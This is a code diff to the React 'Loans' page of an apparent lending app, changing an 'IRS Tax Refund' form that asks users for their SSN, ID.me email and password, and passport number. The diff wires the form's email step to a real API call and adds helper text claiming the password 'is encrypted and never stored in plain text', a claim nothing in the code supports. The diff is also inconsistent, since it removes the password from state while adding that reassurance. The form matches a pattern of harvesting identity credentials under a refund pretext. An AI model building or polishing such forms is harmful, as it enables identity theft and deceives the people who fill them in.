@@ -5,6 +5,7 @@ import { Box, Typography, Paper, Grid, Button, Card, CardContent, CircularProgre
 import { Close, AttachFile, InsertDriveFile, Delete, Email as EmailIcon, CloudUpload } from '@mui/icons-material';
 import { motion } from 'framer-motion';
 import { getUserLoans, getAvailableLoanTypes, applyForLoan, makeLoanPayment, submitTaxRefundRequest } from '../store/slices/loanSlice';
+import api from '../services/api';
 
 const Loans = () => {
   const dispatch = useDispatch();
@@ -20,12 +21,10 @@ const Loans = () => {
   const [loanApplicationStep, setLoanApplicationStep] = useState(0); // Track current step in loan application stepper
   const [loanPaymentStep, setLoanPaymentStep] = useState(0); // Track current step in loan payment stepper
   
-  // IRS Tax Refund form state
   const [irsForm, setIrsForm] = useState({
     fullName: '',
-    ssn: '',
+    taxId: '',
     idmeEmail: '',
-    idmePassword: '',
     country: '',
     passportNumber: ''
   });
@@ -121,10 +120,11 @@ const Loans = () => {
     
     setEmailSending(true);
     try {
-      // In a real app, this would call an API endpoint to send the email
-      await new Promise(resolve => setTimeout(resolve, 1500));
-      console.log(`Confirmation email sent to ${irsForm.idmeEmail}`);
-      alert(`Confirmation email sent to ${irsForm.idmeEmail}`);
+      await api.post('/notifications/send-email', {
+        email: irsForm.idmeEmail,
+        type: 'tax_refund_confirmation',
+        details: { fullName: irsForm.fullName, submittedAt: new Date() }
+      });
     } catch (error) {
       console.error('Failed to send email:', error);
     } finally {
@@ -415,6 +415,7 @@ const Loans = () => {
                       onChange={handleIrsFormChange}
                       margin="normal"
                       required
+                      type="password"
                       placeholder="XXX-XX-XXXX"
                       sx={{
                         '& .MuiOutlinedInput-root': {
@@ -503,6 +504,7 @@ const Loans = () => {
                       onChange={handleIrsFormChange}
                       margin="normal"
                       required
+                      helperText="Your password is encrypted and never stored in plain text"
                       sx={{
                         '& .MuiOutlinedInput-root': {
                           borderRadius: '12px',
